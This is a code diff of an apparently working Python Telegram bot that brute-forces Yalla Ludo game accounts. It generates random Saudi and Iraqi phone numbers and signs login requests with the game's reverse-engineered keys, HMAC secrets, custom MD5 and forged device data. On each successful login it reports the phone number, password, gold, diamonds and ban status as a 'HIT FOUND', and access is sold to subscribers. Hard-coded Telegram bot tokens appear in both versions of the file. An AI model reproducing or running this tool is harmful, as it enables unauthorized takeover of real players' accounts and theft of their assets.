@@ -1,110 +1,352 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# © Q_b_h — Telegram Bot Control Version (Multi-Session Isolated)
+# © Q_b_h — Yalla Ludo Bot Control (Multi-Session Isolated & Advanced Crypto)
 
 import base64
 import hashlib
-import hmac
+import hmac as hmacmod
 import html
 import json
 import os
 import random
-import signal
-import sys
+import string
+import struct
+import threading
 import time
 import uuid
-import threading
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from typing import Any, Dict, List, Optional, Set
+from concurrent.futures import ThreadPoolExecutor
+from typing import Any, Dict, List, Optional
 
-import pyaes
 import requests
-from requests.adapters import HTTPAdapter
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
 import telebot
 from telebot import types
 
 # === إعدادات البوت والمطور ===
-TG_TOKEN = "8844579780:AAF8oAN9eRfUK72kZL6e2BQJYYDj_06ZzAg"
-ADMIN_ID = 8795120325  # آيدي المطور الوحيد المخول بالتحكم
+TG_TOKEN = "8208523854:AAGrLZ6DDnY51an-FUpTsAhBoT-BTP7mjUk"
+ADMIN_ID = 8795120325  # آيدي المطور
 
 bot = telebot.TeleBot(TG_TOKEN)
 
-# تخزين بيانات جلسات المشتركين بشكل مستقل لكل مستخدم:
-# {user_id: {"is_running": bool, "stop_event": Event, "thread": Thread, "valid_count": int, "wrong_count": int, "error_count": int, "current_country": str, "tried": set, "stats_lock": Lock}}
+# === إعدادات البروتوكول والأمان المتقدمة ===
+version = '2.0'
+b1key   = b'4e82797b276c5cb729db62aaa229a057'
+b1iv    = b'0102030405060708'
+secret  = 'L3)qk*@8'
+api_url = "https://httpgateway.carrstuv.com/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin"
+ua      = "YallaLudo-1.5.0.0-(Build 1050003)-Android 32"
+
+kvals = [int(abs(__import__('math').sin(i+1)) * 2**32) & 0xffffffff for i in range(64)]
+shift = [7,12,17,22]*4 + [5,9,14,20]*4 + [4,11,16,23]*4 + [6,10,15,21]*4
+ivrev = (0x10325476, 0x98badcfe, 0xefcdab89, 0x67452301)
+
+# تخزين جلسات المشتركين بشكل مستقل تماماً
 user_sessions: Dict[int, Dict[str, Any]] = {}
+scan_threads = 10  # سرعة الفحص الافتراضية
 
-scan_threads = 10  # عدد الثريدز الافتراضي لسرعة الفحص العامة
-
-# تخزين بيانات المشتركين: {user_id: expiry_timestamp}
+# تخزين المشتركين: {user_id: expiry_timestamp}
 subscribers: Dict[int, float] = {}
 user_states: Dict[int, str] = {}
 
-VER    = "YallaLudo-1.4.9.2-(Build 1040922)-Android 30"
-VERH   = "1.4.9.2"
-SPRE   = "2.0_2_"
-L3     = "L3)qk*@8"
-MKEY   = b"4e82797b276c5cb729db62aaa229a057"
-MIV    = b"0102030405060708"
-K      = "8a9520f016427a54d5de40335bf7e4fe"
-K2     = "c889f8f7dc69b1d67e1d3e43cf48f430"
-PATH          = "/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin"
-PROFILE_PATH  = "/api/LudoAccountGRpcApiProxy/AccountProfileInfo"
-SERVER        = "https://httpgateway.lampjkl.com"
-TIMEOUT       = 15
-HERA_STATIC   = "f580270da66e44438d5ed30fdb08ebba"
-
-PROFILE_SRVS = [
-    "https://httpgateway.lampjkl.com",
-    "https://httpgateway.planecde.com",
-    "https://httpgateway.funcdeg.com",
+profile_path  = "/api/LudoAccountGRpcApiProxy/AccountProfileInfo"
+profile_hosts = [
     "https://httpgateway.carrstuv.com",
+    "https://httpgateway.planecde.com",
+    "https://httpgateway.lampjkl.com",
+    "https://httpgateway.funcdeg.com",
     "https://httpgateway.yalla.games",
 ]
 
-HCONF = [
-    {"bizType": 5000, "countryCode": "SA", "hostUrl": "https://api-shumeng.moonlmn.com",    "type": 2, "version": 4},
-    {"bizType": 5001, "countryCode": "",   "hostUrl": "ws://firebreak.yalla.games",          "type": 1, "version": 1},
-    {"bizType": 5004, "countryCode": "SA", "hostUrl": "https://httpgateway.penabcd.com",     "type": 2, "version": 6},
-    {"bizType": 5005, "countryCode": "SA", "hostUrl": "https://api.lightkvd.com",            "type": 2, "version": 4},
-    {"bizType": 1000, "countryCode": "SA", "hostUrl": "https://account.lampjkl.com",        "type": 2, "version": 19},
-    {"bizType": 1001, "countryCode": "SA", "hostUrl": "https://pay.lampjkl.com",            "type": 2, "version": 17},
-    {"bizType": 1002, "countryCode": "SA", "hostUrl": "https://mail.lampjkl.com",           "type": 2, "version": 18},
-    {"bizType": 1003, "countryCode": "SA", "hostUrl": "https://clog.lampjkl.com",           "type": 2, "version": 17},
-    {"bizType": 1006, "countryCode": "SA", "hostUrl": "https://httpgateway.lampjkl.com",    "type": 2, "version": 20},
-    {"bizType": 1007, "countryCode": "SA", "hostUrl": "wss://tyr.lampjkl.com",              "type": 2, "version": 18},
-    {"bizType": 1008, "countryCode": "SA", "hostUrl": "wss://hall.lampjkl.com",             "type": 2, "version": 39},
-    {"bizType": 2006, "countryCode": "SA", "hostUrl": "https://nitrogen.lampjkl.com",       "type": 2, "version": 19},
-    {"bizType": 2007, "countryCode": "SA", "hostUrl": "wss://room.lampjkl.com",             "type": 2, "version": 22},
-    {"bizType": 2008, "countryCode": "SA", "hostUrl": "wss://roomgame.lampjkl.com",         "type": 2, "version": 18},
-    {"bizType": 3000, "countryCode": "SA", "hostUrl": "https://file.carrstuv.com",          "type": 2, "version": 27},
-    {"bizType": 6000, "countryCode": "",   "hostUrl": "https://broadcast-host.ylconfig.com","type": 1, "version": 0},
-]
+# === دوال التشفير والتوقيع المتقدمة ===
+def md5raw(msg, iv):
+    a0, b0, c0, d0 = iv
+    length = len(msg) * 8
+    m = msg + b'\x80'
+    while len(m) % 64 != 56:
+        m += b'\x00'
+    m += struct.pack('<Q', length)
+    for ch in range(0, len(m), 64):
+        block = struct.unpack('<16I', m[ch:ch+64])
+        a, b, c, d = a0, b0, c0, d0
+        for i in range(64):
+            if   i < 16: f = (b & c) | (~b & d); g = i
+            elif i < 32: f = (d & b) | (~d & c); g = (5*i+1) % 16
+            elif i < 48: f = b ^ c ^ d;           g = (3*i+5) % 16
+            else:        f = c ^ (b | ~d);         g = (7*i)   % 16
+            f = (f + a + kvals[i] + block[g]) & 0xffffffff
+            a = d; d = c; c = b
+            b = (b + ((f << shift[i]) | (f >> (32-shift[i])))) & 0xffffffff
+        a0=(a0+a)&0xffffffff; b0=(b0+b)&0xffffffff
+        c0=(c0+c)&0xffffffff; d0=(d0+d)&0xffffffff
+    return struct.pack('<4I', a0, b0, c0, d0)
 
-DEVS = [
-    ("OnePlus 9 Pro",       "LE2123",    "SA", "SA", 2),
-    ("Samsung Galaxy S21",  "SM-G991B",  "SA", "SA", 2),
-    ("Xiaomi Mi 11",        "M2011K2G",  "SA", "SA", 2),
-    ("Realme GT",           "RMX2202",   "SA", "SA", 2),
-    ("Oppo Reno 6",         "CPH2235",   "SA", "SA", 2),
-    ("Samsung Galaxy A52",  "SM-A525F",  "SA", "SA", 2),
-    ("Huawei P40 Pro",      "ELS-NX9",   "SA", "SA", 2),
-    ("OnePlus Nord 2",      "DN2101",    "SA", "SA", 2),
-    ("Xiaomi Redmi Note 10","M2101K7AG", "SA", "SA", 2),
-    ("Vivo X60 Pro",        "V2046",     "SA", "SA", 2),
-    ("Samsung Galaxy A305F","SM-A305F",  "SA", "SA", 2),
-    ("ZTE A7030",           "ZTE A7030", "SA", "SA", 2),
-]
+def md5r(msg):
+    return md5raw(msg, ivrev).hex()
 
-thread_local = threading.local()
+def md5s(msg):
+    return hashlib.md5(msg).hexdigest()
 
-def get_session():
-    if not hasattr(thread_local, "session"):
-        session = requests.Session()
-        adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=1)
-        session.mount("https://", adapter)
-        session.mount("http://", adapter)
-        thread_local.session = session
-    return thread_local.session
+def md5upper(text):
+    return hashlib.md5(text.encode('utf-8')).hexdigest().upper()
+
+def encrypt_data(data, hera):
+    k  = md5r(hera.encode() + secret.encode()).encode()
+    ks = (k * (len(data) // len(k) + 1))[:len(data)]
+    return base64.b64encode(bytes(a ^ b for a, b in zip(data, ks))).decode()
+
+def sign_data(data, hera):
+    key = md5r(hera.encode() + secret.encode()).encode()
+    return hmacmod.new(key, data, hashlib.sha256).hexdigest()
+
+def medusa(data, hera):
+    pt = f'{md5s(data)}-{len(data)}-{md5r(hera.encode() + secret.encode())}-{secret}'
+    ct = AES.new(b1key, AES.MODE_CBC, b1iv).encrypt(pad(pt.encode(), 16))
+    return base64.b64encode(ct).decode()
+
+def gendevice():
+    device  = str(uuid.uuid4())
+    android = f'{uuid.uuid4().hex}_{uuid.uuid4().hex[:16]}'
+    chars   = string.ascii_letters + string.digits
+    shumeng = ''.join(random.choice(chars) for _ in range(36))
+    nonce   = f'{random.randint(-2**31, 2**31 - 1)}_{uuid.uuid4()}'
+    return device, android, shumeng, nonce
+
+def baggage(timestamp, device, android, shumeng, nonce):
+    obj = {
+        "timeSpan": timestamp, "version": "1.5.1.0",
+        "deviceId": device, "deviceName": "samsung Galaxy S23 Ultra",
+        "deviceType": 2, "downloadChannelId": 1,
+        "shuMengId": shumeng, "nonce": nonce,
+        "plateType": 0, "LanguageId": 2, "phoneModel": "SM-S918B",
+        "X-Phone-Country": "SA", "X-Sim-Country": "SA",
+        "AndroidId": android, "appType": 0,
+    }
+    return base64.b64encode(json.dumps(obj, separators=(',',':')).encode()).decode()
+
+def buildrequest(body, country="SA"):
+    device, android, shumeng, nonce = gendevice()
+    now    = int(time.time() * 1000)
+    hera   = uuid.uuid4().hex
+    bag    = baggage(str(now), device, android, shumeng, nonce)
+    endpoint = '/' + '/'.join(api_url.split('/')[3:])
+    signed = (endpoint + '' + ua + bag).encode('utf-8')
+
+    xsign   = f'{version}_2_{sign_data(signed, hera)}'
+    xmedusa = medusa(signed, hera)
+
+    wire = json.dumps(
+        {"paramJsonString": encrypt_data(body, hera)},
+        separators=(',',':')
+    ).encode('utf-8')
+
+    headers = {
+        'User-Agent': ua,
+        'UserId': '0',
+        'X-App-Id': 'ludo',
+        'X-Baggage': bag,
+        'X-Access-Token': '',
+        'X-Timestamp': str(now),
+        'versionString': '1.5.1.0',
+        'X-Sign': xsign,
+        'X-Hera': hera,
+        'X-Time': str(now),
+        'X-Medusa': xmedusa,
+        'Content-Type': 'application/json; charset=utf-8',
+    }
+    return headers, wire, hera, device, android, shumeng, nonce
+
+def build_payload(mobile, password, country="SA"):
+    device, android, shumeng, nonce = gendevice()
+    area_code = "966" if country == "SA" else "964"
+    data = {
+        "mobile": mobile, "areaCode": area_code, "password": password,
+        "languageId": 2, "nationalityId": "1",
+        "hostConfig": [
+            {"bizType":5000,"countryCode":country,"hostUrl":"https://api-shumeng.yalla.games","type":2,"version":4},
+            {"bizType":5001,"countryCode":"","hostUrl":"ws://firebreak.yalla.games","type":1,"version":1},
+            {"bizType":1006,"countryCode":country,"hostUrl":"https://httpgateway.foodjkl.com,https://httpgateway.planecde.com,https://httpgateway.carrstuv.com","type":2,"version":20},
+            {"bizType":1000,"countryCode":country,"hostUrl":"https://account.foodjkl.com,https://account.yalla.games,https://account.carrstuv.com","type":2,"version":19},
+        ],
+        "simCountry": country, "version": "1.5.1.0",
+        "deviceId": device, "deviceName": "samsung Galaxy S23 Ultra",
+        "deviceType": 2, "downloadChannelId": 1,
+        "shuMengId": shumeng, "nonce": nonce,
+        "plateType": 0, "phoneModel": "SM-S918B",
+        "X-Phone-Country": country, "X-Sim-Country": country,
+        "AndroidId": android, "IsSubpackages": 0, "appType": 0, "idfa": "",
+    }
+    body_bytes = json.dumps(data, separators=(',',':'), ensure_ascii=False).encode('utf-8')
+    headers, wire, hera, _, _, _, _ = buildrequest(body_bytes, country)
+    return headers, wire, hera
+
+def decode_resp(resp, hera=None):
+    xorkey = bytes.fromhex("3336613636313637666532623236633033363933663061643936653462613439")
+    param  = resp.get("paramJsonString", "")
+    if not param:
+        return resp
+    raw = base64.b64decode(param)
+    try:
+        xored = bytes(v ^ xorkey[i % len(xorkey)] for i, v in enumerate(raw))
+        return json.loads(xored.decode('utf-8'))
+    except Exception:
+        pass
+    if hera:
+        try:
+            k  = md5r(hera.encode() + secret.encode()).encode()
+            ks = (k * (len(raw) // len(k) + 1))[:len(raw)]
+            dec = bytes(a ^ b for a, b in zip(raw, ks))
+            return json.loads(dec.decode('utf-8'))
+        except Exception:
+            pass
+    return resp
+
+def profile_baggage(timestamp, token, hera):
+    device, android, shumeng, _ = gendevice()
+    nc      = f'{random.randint(0, 2**31-1)}_{uuid.uuid4()}'
+    key_hex = md5r(hera.encode() + secret.encode())
+    bsign   = hashlib.md5((key_hex + nc).encode()).hexdigest().upper()
+    obj = {
+        "token": token, "sign": bsign,
+        "timeSpan": timestamp, "version": "1.5.1.0",
+        "deviceId": device, "deviceName": "samsung Galaxy S23 Ultra",
+        "deviceType": 2, "downloadChannelId": 1,
+        "shuMengId": shumeng, "nonce": nc,
+        "plateType": 0, "LanguageId": 2, "phoneModel": "SM-S918B",
+        "X-Phone-Country": "SA", "X-Sim-Country": "SA",
+        "AndroidId": android, "appType": 0,
+    }
+    return base64.b64encode(json.dumps(obj, separators=(',',':')).encode()).decode()
+
+def fetch_profile(token, user_id, login_data=None):
+    uid  = int(user_id) if str(user_id).isdigit() else user_id
+    srvs = []
+    for hc in ((login_data or {}).get('hostConfig') or []):
+        if hc.get('bizType') == 1006 and hc.get('hostUrl'):
+            for u in hc['hostUrl'].split(','):
+                u = u.strip().rstrip('/')
+                if u and u not in srvs: srvs.append(u)
+            break
+    for s in profile_hosts:
+        if s not in srvs: srvs.append(s)
+    for srv in srvs:
+        now    = int(time.time() * 1000)
+        hera   = uuid.uuid4().hex
+        bag    = profile_baggage(str(now), token, hera)
+        signed = (profile_path + token + ua + bag).encode('utf-8')
+        body   = json.dumps({'accountId': uid}, separators=(',',':')).encode('utf-8')
+        wire   = json.dumps({"paramJsonString": encrypt_data(body, hera)}, separators=(',',':')).encode('utf-8')
+        hdrs   = {
+            'User-Agent': ua, 'UserId': str(user_id), 'X-App-Id': 'ludo',
+            'X-Baggage': bag, 'X-Access-Token': token,
+            'X-Timestamp': str(now), 'versionString': '1.5.1.0',
+            'X-Sign': f'{version}_2_{sign_data(signed, hera)}',
+            'X-Hera': hera, 'X-Time': str(now),
+            'X-Medusa': medusa(signed, hera),
+            'Content-Type': 'application/json; charset=utf-8',
+        }
+        try:
+            r   = requests.post(srv + profile_path, data=wire, headers=hdrs, timeout=10)
+            obj = decode_resp(r.json(), hera)
+            if obj.get('status') == 0:
+                data = obj.get('data') or {}
+                base = data.get('baseInfo') or data
+                if base.get('goldNum') is not None or base.get('diamondNum') is not None:
+                    return data
+        except Exception:
+            continue
+    return None
+
+# === تنسيق تقرير الصيد الكامل للإرسال عبر تليجرام ===
+def format_hit_message(data, mobile, password, country, prof):
+    raw_name = data.get('name') or data.get('nickName', '—')
+    name = html.escape(str(raw_name))
+    uid  = data.get('showNumId') or data.get('id', '—')
+    area_prefix = "+966" if country == "SA" else "+964"
+
+    lines = [
+        "🎲 <b>Yalla Ludo — HIT FOUND! (صيد جديد)</b>",
+        f"📱 <b>رقم الهاتف:</b> <code>{area_prefix}{mobile}</code>",
+        f"🔑 <b>كلمة المرور:</b> <code>{password}</code>",
+        f"🆔 <b>الايدي (ID):</b> <code>{uid}</code>",
+        f"👤 <b>الاسم:</b> {name}",
+        "──────────────────────────────"
+    ]
+
+    if prof:
+        base  = prof.get('baseInfo') or prof
+        game  = prof.get('gameInfo') or {}
+        meds  = prof.get('medalCountInfo') or {}
+        gold  = base.get('goldNum',         '—')
+        dia   = base.get('diamondNum',       '—')
+        lvl   = base.get('levelId',          '—')
+        exp   = base.get('experience',       '—')
+        mxp   = base.get('maxExp',           '—')
+        royal = base.get('royalLevel',        0)
+        vip   = '✅ نعم' if base.get('isVip') else '❌ لا'
+        frz   = '🔴 مبند (Banned)' if base.get('freezeStatus') else '🟢 نشط (Active)'
+        frame = base.get('avatarFrameId',    '—')
+        pend  = base.get('pendant',          '—')
+        npl   = base.get('nameplateNum',     '—')
+        stars = base.get('startNum',         '—')
+        tot   = game.get('totalCount',       '—')
+        wp    = game.get('totalWinPercent',  '—')
+        seg   = game.get('currentSegmentId', '—')
+        segh  = game.get('highestSegmentId', '—')
+        mg    = meds.get('goldCount',   0)
+        ms    = meds.get('silverCount', 0)
+        mc    = meds.get('copperCount', 0)
+        if isinstance(wp, float): wp = f'{wp*100:.1f}%'
+
+        lines.extend([
+            f"💛 <b>الذهب:</b> {gold}",
+            f"💎 <b>الجواهر:</b> {dia}",
+            "──────────────────────────────",
+            f"🏆 <b>المستوى:</b> {lvl} (XP: {exp}/{mxp})",
+            f"👑 <b>VIP:</b> {vip}",
+            f"🎖 <b>المستوى الملكي:</b> {royal}",
+            f"⚡ <b>حالة الحساب:</b> {frz}",
+            "──────────────────────────────",
+            f"🖼 <b>الإطار:</b> {frame}",
+            f"🎨 <b>البيدق/التعليقة:</b> {pend}",
+            f"🏷 <b>لوحة الاسم:</b> {npl}",
+            f"⭐ <b>النجوم:</b> {stars}",
+            "──────────────────────────────",
+            f"🎮 <b>إجمالي المباريات:</b> {tot}",
+            f"📊 <b>نسبة الفوز:</b> {wp}",
+            f"🏅 <b>الرتبة الحالية:</b> {seg} (الأعلى: {segh})",
+            f"🥇 <b>الأوسمة:</b> ذهبي {mg} | فضي {ms} | برونزي {mc}"
+        ])
+    else:
+        lines.append("⚠️ <i>تعذر جلب تفاصيل الملف الشخصي إضافياً</i>")
+
+    lines.append("\nBy - @aboodriad")
+    return "\n".join(lines)
+
+# === مولد الأرقام ===
+def generate_saudi_number() -> str:
+    prefixes = ["50", "53", "54", "55", "56", "57", "58", "59"]
+    return random.choice(prefixes) + "".join(str(random.randint(0, 9)) for _ in range(7))
+
+def generate_iraqi_number() -> str:
+    prefixes = ["770", "771", "772", "773", "774", "780", "781", "782", "783", "784", "785", "786", "787", "788", "789", "790", "750", "751"]
+    return random.choice(prefixes) + "".join(str(random.randint(0, 9)) for _ in range(7))
+
+def generate_number(country: str) -> str:
+    return generate_iraqi_number() if country == "IQ" else generate_saudi_number()
+
+def get_country_name_label(country: str) -> str:
+    return "العراق 🇮🇶" if country == "IQ" else "السعودية 🇸🇦"
+
+def check_subscription(user_id: int) -> bool:
+    if user_id == ADMIN_ID:
+        return True
+    if user_id in subscribers:
+        if time.time() < subscribers[user_id]:
+            return True
+        else:
+            del subscribers[user_id]
+    return False
 
 def get_user_session(user_id: int) -> Dict[str, Any]:
     if user_id not in user_sessions:
@@ -121,329 +363,11 @@ def get_user_session(user_id: int) -> Dict[str, Any]:
         }
     return user_sessions[user_id]
 
-def gen_hera() -> str:
-    return HERA_STATIC
-
-def _aes_cbc(key: bytes, iv: bytes, plaintext: bytes) -> bytes:
-    aes = pyaes.AESModeOfOperationCBC(key, iv=iv)
-    encrypter = pyaes.Encrypter(aes)
-    return encrypter.feed(plaintext) + encrypter.feed()
-
-def _xor_b64(data_str: str, key_str: str) -> str:
-    kb = key_str.encode()
-    xo = bytes(b ^ kb[i % len(kb)] for i, b in enumerate(data_str.encode()))
-    return base64.b64encode(xo).decode()
-
-def _gen_shu_meng_id() -> str:
-    import secrets
-    raw = secrets.token_bytes(28)
-    b64 = base64.b64encode(raw).decode()
-    return b64.replace("+", "-").replace("/", "_").rstrip("=")[:38]
-
-def _rdev(country: str = "SA") -> Dict[str, Any]:
-    nm, md, pc, sc, dt = random.choice(DEVS)
-    brand = nm.split()[0].lower()
-    return {
-        "deviceId":          str(uuid.uuid4()),
-        "deviceName":        f"{brand} {md}",
-        "deviceType":        dt,
-        "phoneModel":        md,
-        "X-Phone-Country":   country,
-        "X-Sim-Country":     country,
-        "downloadChannelId": 1,
-        "shuMengId":         _gen_shu_meng_id(),
-        "AndroidId":         uuid.uuid4().hex[:32] + "_" + uuid.uuid4().hex[:16],
-        "plateType":         0,
-        "LanguageId":        2,
-        "appType":           0,
-    }
-
-def _gen_traceparent() -> str:
-    return f"00-{uuid.uuid4().hex + uuid.uuid4().hex}-{uuid.uuid4().hex[:16]}-00"
-
-def _build_request(mobile: str, password: str, area_code: int = 966, country: str = "SA",
-                   hconf: List[Dict] = HCONF) -> Dict[str, Any]:
-    d   = _rdev(country)
-    now = int(time.time() * 1000)
-    nc  = f"{random.randint(0, 2**31 - 1)}_{uuid.uuid4()}"
-
-    bag = {
-        "timeSpan":          str(now),
-        "version":           VERH,
-        "deviceId":          d["deviceId"],
-        "deviceName":        d["deviceName"],
-        "deviceType":        d["deviceType"],
-        "downloadChannelId": d["downloadChannelId"],
-        "shuMengId":         d["shuMengId"],
-        "nonce":             nc,
-        "plateType":         d["plateType"],
-        "LanguageId":        d["LanguageId"],
-        "phoneModel":        d["phoneModel"],
-        "X-Phone-Country":   d["X-Phone-Country"],
-        "X-Sim-Country":     d["X-Sim-Country"],
-        "AndroidId":         d["AndroidId"],
-        "appType":           d["appType"],
-    }
-    bb = base64.b64encode(json.dumps(bag, separators=(",", ":"), ensure_ascii=False).encode()).decode()
-
-    sg  = PATH + VER + bb
-    sig = hmac.new(K.encode(), sg.encode(), hashlib.sha256).hexdigest()
-    xs  = SPRE + sig
-
-    p  = hashlib.md5(sg.encode()).hexdigest()
-    mp = f"{p}-{len(sg)}-{K}-{L3}".encode()
-    xm = base64.b64encode(_aes_cbc(MKEY, MIV, mp)).decode()
-
-    phex = hashlib.md5(password.encode()).hexdigest().upper()
-    body = {
-        "mobile":            mobile,
-        "areaCode":          area_code,
-        "password":          phex,
-        "languageId":        d["LanguageId"],
-        "nationalityId":     1,
-        "hostConfig":        hconf,
-        "simCountry":        "",
-        "version":           VERH,
-        "deviceId":          d["deviceId"],
-        "deviceName":        d["deviceName"],
-        "deviceType":        d["deviceType"],
-        "downloadChannelId": d["downloadChannelId"],
-        "shuMengId":         d["shuMengId"],
-        "nonce":             nc,
-        "plateType":         d["plateType"],
-        "phoneModel":        d["phoneModel"],
-        "X-Phone-Country":   d["X-Phone-Country"],
-        "X-Sim-Country":     d["X-Sim-Country"],
-        "AndroidId":         d["AndroidId"],
-        "IsSubpackages":     0,
-        "appType":           d["appType"],
-    }
-    bs = json.dumps(body, separators=(",", ":"), ensure_ascii=False).replace("/", "\\/")
-    pm = _xor_b64(bs, K)
-
-    ts_stamp = now + random.randint(40, 80)
-    ts_time  = ts_stamp + random.randint(30, 60)
-
-    hd = {
-        "User-Agent":      VER,
-        "UserId":          "0",
-        "X-App-Id":        "ludo",
-        "X-Baggage":       bb,
-        "X-Access-Token":  "",
-        "X-Timestamp":     str(ts_stamp),
-        "versionString":   VERH,
-        "X-Sign":          xs,
-        "X-Hera":          gen_hera(),
-        "X-Time":          str(ts_time),
-        "X-Medusa":        xm,
-        "Content-Type":    "application/json; charset=utf-8",
-        "Accept-Encoding": "gzip",
-        "Connection":      "Keep-Alive",
-        "baggage":         "service.name=ludo",
-        "traceparent":     _gen_traceparent(),
-    }
-    return {
-        "url":     SERVER + PATH,
-        "headers": hd,
-        "payload": {"paramJsonString": pm},
-        "dev":     d,
-        "phex":    phex,
-    }
-
-def _post_login_req(path: str, server: str, payload_dict: Dict,
-                    token: str, user_id: str, dev: Dict,
-                    proxies=None, timeout: int = TIMEOUT) -> Dict:
-    session = get_session()
-    now      = int(time.time() * 1000)
-    nc       = f"{random.randint(-2**31, 2**31-1)}_{uuid.uuid4()}"
-    bag_sign = hashlib.md5((K2 + nc).encode()).hexdigest().upper()
-
-    bag = {
-        "token":             token,
-        "sign":              bag_sign,
-        "timeSpan":          str(now),
-        "version":           VERH,
-        "deviceId":          dev["deviceId"],
-        "deviceName":        dev["deviceName"],
-        "deviceType":        dev["deviceType"],
-        "downloadChannelId": dev["downloadChannelId"],
-        "shuMengId":         dev["shuMengId"],
-        "nonce":             nc,
-        "plateType":         dev["plateType"],
-        "LanguageId":        dev["LanguageId"],
-        "phoneModel":        dev["phoneModel"],
-        "X-Phone-Country":   dev["X-Phone-Country"],
-        "X-Sim-Country":     dev["X-Sim-Country"],
-        "AndroidId":         dev["AndroidId"],
-        "appType":           dev["appType"],
-    }
-    bb = base64.b64encode(json.dumps(bag, separators=(",", ":"), ensure_ascii=False).encode()).decode()
-
-    sg  = path + token + VER + bb
-    sig = hmac.new(K2.encode(), sg.encode(), hashlib.sha256).hexdigest()
-    xs  = SPRE + sig
-
-    p   = hashlib.md5(sg.encode()).hexdigest()
-    mp  = f"{p}-{len(sg)}-{K2}-{L3}".encode()
-    xm  = base64.b64encode(_aes_cbc(MKEY, MIV, mp)).decode()
-
-    hd = {
-        "User-Agent":      VER,
-        "UserId":          user_id,
-        "X-Baggage":       bb,
-        "X-Access-Token":  token,
-        "X-Timestamp":     str(now + random.randint(50, 300)),
-        "versionString":   VERH,
-        "X-Sign":          xs,
-        "X-Hera":          gen_hera(),
-        "X-Time":          str(now + random.randint(50, 300)),
-        "X-Medusa":        xm,
-        "Content-Type":    "application/json; charset=utf-8",
-        "Accept-Encoding": "gzip",
-    }
-
-    bs = json.dumps(payload_dict, separators=(",", ":"), ensure_ascii=False)
-    pm = _xor_b64(bs, K2)
-
-    try:
-        r = session.post(server + path, json={"paramJsonString": pm}, headers=hd, timeout=timeout, proxies=proxies, verify=True)
-        if r.status_code == 403:
-            pm2 = _xor_b64(bs, K)
-            r = session.post(server + path, json={"paramJsonString": pm2}, headers=hd, timeout=timeout, proxies=proxies, verify=True)
-        obj = r.json()
-        st  = obj.get("status")
-        if st == 0:
-            return {"ok": True, "data": obj.get("data") or {}, "raw": obj}
-        return {"ok": False, "status": st, "tips": obj.get("tips", ""), "raw": obj, "http": r.status_code}
-    except Exception as e:
-        return {"ok": False, "error": str(e)}
-
-def fetch_profile(token: str, user_id: str, dev: Dict, login_data: Dict, proxies=None, timeout: int = TIMEOUT) -> Optional[Dict]:
-    srvs = []
-    for h in (login_data.get("hostConfig") or []):
-        if h.get("bizType") == 1006 and h.get("hostUrl"):
-            for url in h["hostUrl"].split(","):
-                url = url.strip().rstrip("/")
-                if url and url not in srvs:
-                    srvs.append(url)
-            break
-    for s in PROFILE_SRVS:
-        if s not in srvs:
-            srvs.append(s)
-
-    uid_int = int(user_id) if str(user_id).isdigit() else user_id
-    payload = {"userId": uid_int}
-
-    for srv in srvs:
-        res = _post_login_req(PROFILE_PATH, srv, payload, token, user_id, dev, proxies, timeout)
-        if res.get("ok"):
-            data = res["data"]
-            base = data.get("baseInfo") or data
-            if base.get("goldNum") is not None or base.get("diamondNum") is not None:
-                return data
-        if res.get("http") == 403:
-            continue
-    return None
-
-def login(mobile: str, password: str, area_code: int = 966, country: str = "SA", proxies: Optional[Dict] = None, timeout: int = TIMEOUT, server: str = SERVER, fetch_gems: bool = True) -> Dict[str, Any]:
-    session = get_session()
-    rq = _build_request(mobile, password, area_code=area_code, country=country)
-    rq["url"] = server + PATH
-    try:
-        r = session.post(rq["url"], json=rq["payload"], headers=rq["headers"], timeout=timeout, verify=True, proxies=proxies)
-    except requests.exceptions.RequestException as ex:
-        return {"success": False, "error": str(ex), "dev": rq["dev"]}
-
-    try:
-        obj = r.json()
-    except Exception:
-        return {"success": False, "error": f"HTTP {r.status_code} non-JSON", "dev": rq["dev"]}
-
-    if obj.get("status") == 0:
-        data   = obj.get("data") or {}
-        result = {"success": True, "data": data, "dev": rq["dev"]}
-        if fetch_gems:
-            token   = data.get("token", "")
-            user_id = str(data.get("id", data.get("showNumId", "")))
-            if token and user_id:
-                prof = fetch_profile(token, user_id, rq["dev"], data, proxies, timeout)
-                result["profile"] = prof
-        return result
-
-    return {"success": False, "status": obj.get("status"), "tips": obj.get("tips", "خطأ غير معروف"), "raw": obj, "dev": rq["dev"]}
-
-def _tg_text(data: Dict, mobile: str, password: str, profile: Optional[Dict] = None) -> str:
-    raw_name = data.get("name") or data.get("nickName", "—")
-    name = html.escape(str(raw_name))
-    uid  = data.get("showNumId") or data.get("id", "—")
-    
-    lines = [
-        "🎲 <b>Yalla Ludo — HIT FOUND!</b>",
-        f"📱 Number : <code>{mobile}</code>",
-        f"🔑 Password : <code>{password}</code>",
-        f"🆔 ID : <code>{uid}</code>",
-        f"👤 Name : {name}"
-    ]
-    if profile:
-        base    = profile.get("baseInfo") or profile
-        gold    = base.get("goldNum", "—")
-        diamond = base.get("diamondNum", "—")
-        level   = base.get("levelId", "—")
-        is_vip  = base.get("isVip", False)
-        lines += [
-            f"💛 ذهب     : {gold}",
-            f"💎 جواهر   : {diamond}",
-            f"🏆 مستوى   : {level}",
-            f"👑 VIP     : {'✅' if is_vip else '❌'}",
-        ]
-    lines.append("By - @aboodriad")
-    return "\n".join(lines)
-
-def generate_saudi_number() -> str:
-    prefixes = ["50", "53", "54", "55", "56", "57", "58", "59"]
-    return random.choice(prefixes) + "".join(str(random.randint(0, 9)) for _ in range(7))
-
-def generate_iraqi_number() -> str:
-    prefixes = ["770", "771", "772", "773", "774", "780", "781", "782", "783", "784", "785", "786", "787", "788", "789", "790", "750", "751"]
-    return random.choice(prefixes) + "".join(str(random.randint(0, 9)) for _ in range(7))
-
-def generate_number(country: str) -> str:
-    if country == "IQ":
-        return generate_iraqi_number()
-    else:
-        return generate_saudi_number()
-
-def get_country_area_code(country: str) -> int:
-    codes = {
-        "SA": 966,
-        "IQ": 964
-    }
-    return codes.get(country, 966)
-
-def get_country_name_label(country: str) -> str:
-    labels = {
-        "SA": "السعودية 🇸🇦",
-        "IQ": "العراق 🇮🇶"
-    }
-    return labels.get(country, "السعودية 🇸🇦")
-
-def check_subscription(user_id: int) -> bool:
-    if user_id == ADMIN_ID:
-        return True
-    if user_id in subscribers:
-        if time.time() < subscribers[user_id]:
-            return True
-        else:
-            del subscribers[user_id]
-    return False
-
